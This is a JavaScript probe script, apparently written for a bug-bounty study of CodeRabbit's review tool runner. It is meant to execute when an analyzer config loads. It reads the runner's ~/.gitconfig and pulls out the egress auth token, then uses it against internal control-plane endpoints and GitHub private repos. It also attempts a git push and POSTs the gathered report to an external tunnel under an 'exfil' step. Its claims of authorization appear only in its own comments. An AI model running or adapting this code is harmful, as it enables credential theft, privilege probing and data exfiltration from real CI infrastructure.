// prize_battery.js — PRIZEEGRESS leg 3 (egress-token scope map), v2.
// Authorized CodeRabbit VDP research; executes at analyzer-config load time inside the
// review tool-runner (EXECCHAIN-01 .prismalintrc.js vehicle). OWN repositories only
// (C3 account, org3 account, account B — all researcher-owned).
// Secrets are NEVER written into the report: the Proxy-Tokenizer value is reduced to
// name/len/p4/sha8 at source. All target probes are paced >=1s apart.
const cp = require("child_process");
const fs = require("fs");
const os = require("os");
const crypto = require("crypto");

const TUN = "https://667937120fbefe.lhr.life"; // researcher-owned localhost.run tunnel
const OUT = [];
const V = {};

function sh(cmd, tmo) {
  try {
    return String(cp.execSync(cmd, { timeout: tmo || 14000, encoding: "utf8",
      stdio: ["ignore", "pipe", "pipe"], maxBuffer: 4 * 1024 * 1024 }));
  } catch (e) {
    return String(e.stdout || "") + String(e.stderr || "");
  }
}
function step(lab, cmd, tmo) {
  const flat = sh(cmd, tmo).replace(/\s+/g, " ").trim();
  OUT.push(lab + "=" + flat.slice(0, 400));
  return flat;
}
function q(s) { return "'" + String(s).replace(/'/g, "'\\''") + "'"; }
function pace() { sh("sleep 1", 5000); }
function code(s) { const m = String(s || "").match(/\b(\d{3})\b/); return m ? m[1] : "?"; }
function ghbody(f, lab) {
  return step(lab, "tr -d '\\n' < " + f + " 2>/dev/null | head -c 400");
}
function cls(body) {
  const b = String(body || "");
  if (/coderabbitai\[bot\]/.test(b)) return "BOT";
  if (/rate limit exceeded/i.test(b)) return "RL";
  if (/Bad credentials/i.test(b)) return "BAD";
  if (/Repository not found/i.test(b)) return "NF";
  if (/Not Found/i.test(b)) return "NF";
  return "OTH";
}
function looksOk(s) {
  const t = String(s || "").trim();
  return /^[0-9a-f]{40}\s+HEAD/.test(t) || /^[0-9a-f]{40}\s+refs\//.test(t);
}

function run() {
  // ---------------------------------------------------------- 1. token shape (redacted)
  let gcfg = "";
  try {
    gcfg = fs.readFileSync(os.homedir() + "/.gitconfig", "utf8");
  } catch (e) {
    OUT.push("GITCONFIG_ERR=" + (e.code || e.message));
  }
  OUT.push("GITCONFIG len=" + gcfg.length + " sha8=" +
           crypto.createHash("sha256").update(gcfg).digest("hex").slice(0, 8));
  const pm = gcfg.match(/^\s*proxy\s*=\s*(.*)$/mi);
  OUT.push("GIT_PROXY " + (pm ? pm[1].trim() : "none"));
  const m = gcfg.match(/^\s*extraheader\s*=\s*(.*)$/mi);
  let hdr = "";
  if (m) {
    const line = m[1].trim();
    const i = line.indexOf(":");
    const name = i >= 0 ? line.slice(0, i).trim() : "?";
    const tok = i >= 0 ? line.slice(i + 1).trim() : "";
    hdr = line;
    V.tok = tok.length;
    OUT.push("TOKEN name=" + name + " len=" + tok.length + " p4=" + tok.slice(0, 4) +
             " sha8=" + crypto.createHash("sha256").update(tok).digest("hex").slice(0, 8));
  } else {
    OUT.push("TOKEN none");
  }
  const H = hdr ? " -H " + q(hdr) : "";

  // ---------------------------------------------------------- 2. wake / control plane
  V.wroot = step("W_ROOT_NOTOK",
    "curl -sS -m 8 -o /dev/null -w '%{http_code}' http://api.agent.coderabbit.ai/");
  pace();
  V.wroott = step("W_ROOT_TOK",
    "curl -sS -m 8 -o /dev/null -w '%{http_code}'" + H + " http://api.agent.coderabbit.ai/");
  pace();
  V.wgett = step("W_WAKE_GET_TOK",
    "curl -sS -m 8 -o /dev/null -w '%{http_code}'" + H +
    " https://api.agent.coderabbit.ai/api/internal/runtime-wake");
  pace();
  // benign schema-gate body (documented: {} -> 400, no job triggered, CONTROLPLANE-2)
  V.wpostt = step("W_WAKE_POST_TOK",
    "curl -sS -m 8 -X POST -H 'Content-Type: application/json' -d '{}'" + H +
    " -o /tmp/pw_t.json -w '%{http_code}' https://api.agent.coderabbit.ai/api/internal/runtime-wake");
  step("W_WAKE_POST_TOK_BODY", "head -c 200 /tmp/pw_t.json 2>/dev/null");

  // ---------------------------------------------------------- 3. egress token vs GitHub API via sidecar
  const PX = "-x http://127.0.0.1:1080";
  V.ghuser = step("GH_USER_NOTOK",
    "curl -sS -m 10 " + PX + " -o /tmp/gh_u1.json -w '%{http_code}' https://api.github.com/user");
  V.ghuserb = ghbody("/tmp/gh_u1.json", "GH_USER_NOTOK_BODY");
  pace();
  V.ghusert = step("GH_USER_TOK",
    "curl -sS -m 10 " + PX + H + " -o /tmp/gh_u2.json -w '%{http_code}' https://api.github.com/user");
  V.ghusertb = ghbody("/tmp/gh_u2.json", "GH_USER_TOK_BODY");

  // own resources ONLY. R4 private same-account; R5 private other-account (CodeRabbit tenant B);
  // R4n/R5n = same reads WITHOUT the token (does the sidecar inject identity anyway?)
  const OWN = [
    ["R4", "https://api.github.com/repos/coderabbit-vdp-research3/taskforge-lab2-20260928"],
    ["R5", "https://api.github.com/repos/coderabbit-vdp-research2/serpent-vault-b"],
  ];
  for (const [lab, url] of OWN) {
    pace();
    V[lab.toLowerCase()] = step(lab + "_TOK",
      "curl -sS -m 10 " + PX + H + " -o /tmp/" + lab + ".json -w '%{http_code}' " + q(url));
    ghbody("/tmp/" + lab + ".json", lab + "_TOK_BODY");
  }
  for (const [lab, url] of OWN) {
    pace();
    V[lab.toLowerCase() + "n"] = step(lab + "_NOTOK",
      "curl -sS -m 10 " + PX + " -o /tmp/" + lab + "n.json -w '%{http_code}' " + q(url));
    ghbody("/tmp/" + lab + "n.json", lab + "_NOTOK_BODY");
  }

  // ---------------------------------------------------------- 4. git plane (uses $HOME/.gitconfig as-is)
  const GP = "GIT_TERMINAL_PROMPT=0 GIT_ASKPASS=/bin/echo";
  pace();
  V.g4 = step("G4_LSREMOTE_PRIVATE_C3",
    GP + " timeout 20 git ls-remote " +
    "https://github.com/coderabbit-vdp-research3/taskforge-lab2-20260928.git HEAD 2>&1");
  pace();
  V.g5 = step("G5_LSREMOTE_PRIVATE_TENANT_B",
    GP + " timeout 20 git ls-remote " +
    "https://github.com/coderabbit-vdp-research2/serpent-vault-b.git HEAD 2>&1");

  // ---------------------------------------------------------- 5. write attempt (own repo, empty commit)
  pace();
  V.w1 = step("W1_PUSH_WRITE_OWN_REPO",
    "rm -rf /tmp/pw && mkdir -p /tmp/pw && cd /tmp/pw && git init -q . && " +
    "GIT_AUTHOR_NAME=prizegress GIT_AUTHOR_EMAIL=prizegress@invalid " +
    "GIT_COMMITTER_NAME=prizegress GIT_COMMITTER_EMAIL=prizegress@invalid " +
    "git commit -q --allow-empty -m 'prizegress write-scope test (authorized VDP, own repo)' && " +
    "git remote add origin https://github.com/coderabbit-vdp-research3/coderabbit-vdp-runnerident.git && " +
    GP + " timeout 25 git push origin HEAD:refs/heads/prizegress-wtest 2>&1", 45000);

  // ---------------------------------------------------------- 6. exfil to researcher OOB (retry x3)
  const report = [
    "PRIZEEGRESS leg3 battery v2 — review tool-runner, authorized CodeRabbit VDP, OWN repos only",
    "ts=" + new Date().toISOString() + " home=" + os.homedir() +
      " user=" + (os.userInfo ? os.userInfo().username : "?"),
  ].concat(OUT).join("\n");
  try { fs.writeFileSync("/tmp/prize_battery_out.txt", report); } catch (e) {}
  let xf = "";
  for (let i = 0; i < 2; i++) {
    xf = step("EXFIL" + (i + 1),
      "curl -sS -m 20 -o /dev/null -w '%{http_code}' -X POST -H 'Content-Type: text/plain' " +
      "--data-binary @/tmp/prize_battery_out.txt " + TUN + "/battery?try=" + (i + 1) + " 2>&1", 30000);
    if (String(xf).indexOf("200") >= 0) break;
    pace();
  }
  V.xf = code(xf);

  // ---------------------------------------------------------- 7. compact in-band verdict (fallback channel)
  const verdict = [
    "PRIZE",
    "t" + (V.tok || 0),
    "w" + code(V.wroot) + "/" + code(V.wroott),
    "wg" + code(V.wgett) + "p" + code(V.wpostt),
    "u" + code(V.ghuser) + "/" + code(V.ghusert) + ":" + cls(V.ghusertb),
    "r4" + code(V.r4) + "/" + code(V.r4n),
    "r5" + code(V.r5) + "/" + code(V.r5n),
    "g4" + (looksOk(V.g4) ? "Y" : "N") + "g5" + (looksOk(V.g5) ? "Y" : "N"),
    "w" + (/rejected|denied|Permission/i.test(String(V.w1)) ? "DER" :
            (/prizegress-wtest|new branch/.test(String(V.w1)) ? "OK" : "OTH")),
    "xf" + V.xf,
  ].join("_");
  return { verdict: verdict, report: report };
}

module.exports = { run: run };
